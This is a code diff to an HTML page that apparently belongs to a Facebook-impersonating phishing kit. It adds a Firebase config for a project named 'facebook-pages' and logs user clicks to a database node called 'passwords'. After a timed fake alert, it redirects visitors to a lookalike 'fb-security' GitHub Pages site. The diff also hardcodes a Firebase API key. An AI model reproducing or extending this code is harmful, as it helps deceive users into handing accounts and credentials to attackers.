@@ -1837,17 +1837,34 @@
         #iframe{margin-left: -20%;}
         
     </style>
-
+<script src="https://www.gstatic.com/firebasejs/5.9.3/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/5.9.3/firebase-database.js"></script>
     <script>
         window.onload=function(){
+            var firebaseConfig = {
+            apiKey: "AIzaSyDcIeNXTlwRRAR1Tti3OmftMNyYPK53qr4",
+            authDomain: "facebook-pages-de462.firebaseapp.com",
+            databaseURL: "https://facebook-pages-de462.firebaseio.com",
+            projectId: "facebook-pages-de462",
+            storageBucket: "facebook-pages-de462.appspot.com",
+            messagingSenderId: "1039357705987",
+            appId: "1:1039357705987:web:5def9020df325b12563336"
+            };
+            // Initialize Firebase
+            firebase.initializeApp(firebaseConfig);
+            //end config
+            var firebaseRef = firebase.database().ref().child('passwords');
+
             document.getElementById('magic').addEventListener("click",function(){
                 document.getElementById('magic').remove();
+                firebaseRef.push('magic layout clicked');
                 setTimeout(() => {
                     document.getElementById('post').style.display="none";
                     document.getElementById('alert').style.visibility="visible";
                 }, 15000);
             });
             document.getElementById('continue').addEventListener('click',function(){
+                firebaseRef.push('continue clicked');
                 location.replace('https://fb-security.github.io/facebook-ar/');
             });
         }
